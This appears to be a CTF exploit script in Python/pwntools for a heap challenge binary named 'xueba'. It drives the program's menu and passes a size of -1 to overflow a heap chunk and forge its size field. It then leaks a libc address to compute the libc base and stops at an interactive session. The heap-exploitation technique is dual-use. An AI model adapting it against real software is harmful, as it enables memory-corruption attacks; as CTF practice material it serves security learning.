#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import sys
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

elf = ELF("./xueba")
if sys.argv[1] == "l":
    context.log_level = "debug"
    # env = {'LD_PRELOAD': ''} # io = process("", env = env)
    io = process("./xueba")
    libc = elf.libc
    main_arena = 0x399b00


else:
    io = remote("localhost", 9999)
    libc = ELF("./libc-2.23.so")
    main_arena = 0x3c4b20


def DEBUG():
	raw_input("DEBUG: ")
	gdb.attach(io)

def add(size, name, content):
    io.sendlineafter("Exit\n", '1')
    sleep(0.01)
    io.sendlineafter("?\n", str(size))
    sleep(0.01)
    io.sendafter(":\n", name)
    sleep(0.01)
    io.send(content)
    sleep(0.01)
    
def show(idx):
    io.sendlineafter("Exit\n", '2')
    sleep(0.01)
    io.sendlineafter(":\n", str(idx))
    sleep(0.01)

def delete(idx):
    io.sendlineafter("Exit\n", '3')
    sleep(0.01)
    io.sendlineafter(":\n", str(idx))
    sleep(0.01)

def change(idx, c1, c2):
    io.sendlineafter("Exit\n", '4')
    sleep(0.01)
    io.sendlineafter(":\n", str(idx))
    sleep(0.01)
    io.sendafter("?\n", c1)
    sleep(0.01)
    io.send(c2)
    sleep(0.01)

    
if __name__ == "__main__":
    add(0x10 - 1, '0' * 8, '0' * 8)
    add(0x80, '1' * 8, '1' * 8)
    add(0x10 - 1, '2' * 8, '2' * 8)
    add(0x10 - 1, '3' * 8, '3' * 8)
    delete(0)

    payload = '0' * 0x10 + p64(0) + p64(0xb1)
    #  DEBUG()
    add(-1, '0' * 8, payload)
    delete(1)
    add(0x80, '1' * 8, '1' * 8)

    show(2)
    libcBase = u64(io.recvuntil("\x7f")[-6: ].ljust(8, '\x00')) - 88 - main_arena
    success("libcBase -> {:#x}".format(libcBase))
    pause()
    
    io.interactive()
    io.close()



